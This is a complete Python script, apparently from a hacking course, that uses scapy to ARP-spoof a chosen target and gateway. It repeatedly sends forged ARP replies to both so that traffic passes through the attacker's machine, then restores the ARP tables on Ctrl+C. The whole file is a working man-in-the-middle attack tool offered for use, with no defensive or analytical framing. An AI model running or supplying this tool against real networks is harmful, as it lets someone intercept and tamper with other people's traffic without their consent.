#!/usr/bin/env python3

import time
import scapy.all as scapy
from optparse import OptionParser


def get_argument():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target_address", help="Specify the IP address for your target device. "
                                                                    "Example: --target_ip 192.168.1.7")
    parser.add_option("-g", "--gateway", dest="gateway_address",
                      help="Specify the IP address of the gateway to spoof. "
                           "Example: --gateway_ip 192.168.1.1")
    (options, arguments) = parser.parse_args()
    if not options.target_address:
        parser.error("[-] Please specify the target IP address, or type it correctly, ex: -t 192.168.1.8")
    elif not options.gateway_address:
        parser.error("[-] Please specify the gateway IP address, or type it correctly, ex: -g 192.168.1.1")

    return options


def get_mac_address(ip_address):
    try:
        # TODO 1: Create an ARP Request.
        arp_request = scapy.ARP(pdst=ip_address)

        # TODO 2: Broadcast an ARP Packets to all Devices in the Network.
        broadcast_packets = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        # TODO 3: Combining these 2 Packets together to Send.
        broadcast_arp_packets = broadcast_packets / arp_request

        # TODO 4: Start Send These Packets to all Devices.
        answered_device = scapy.srp(x=broadcast_arp_packets, timeout=3, verbose=False)[0]
        return answered_device[0][1].hwsrc
    except IndexError:
        pass


def restore(destination_ip, source_ip):
    destination_mac_address = get_mac_address(ip_address=destination_ip)
    source_mac_address = get_mac_address(ip_address=source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip,
                       hwsrc=source_mac_address)
    scapy.send(packet, verbose=False, count=4)


def spoof(target_ip, spoof_ip):
    # op=1 means this is a 'request' packet, op=2 means this is a 'response' packet.
    # pdst='192.168.1.9', we're setting the target ip address to arp spoofing it.
    # hwsrc='ec:5c:68:67:38:5d', we're setting the target mac address to arp spoofing it.
    # psrc='192.168.1.1', this is false information to tell the target this response comes from the router
    # and not comes from us.
    target_mac_address = get_mac_address(ip_address=target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


option = get_argument()
target_ip_address = option.target_address
gateway_ip_address = option.gateway_address

print('')
packets_counter = 0
try:
    while True:
        spoof(target_ip=target_ip_address, spoof_ip=gateway_ip_address)
        spoof(target_ip=gateway_ip_address, spoof_ip=target_ip_address)
        packets_counter += 2
        print(f'\r[+] Sent {packets_counter} Spoofed Packets.', end='')
        time.sleep(1.7)
except KeyboardInterrupt:
    print("\n[*] Detected 'ctrl + c' pressed, program terminated.\n")
    print("\n[-] Cleaning up and re-arping targets...\n")
    restore(destination_ip=target_ip_address, source_ip=gateway_ip_address)
    restore(destination_ip=gateway_ip_address, source_ip=target_ip_address)
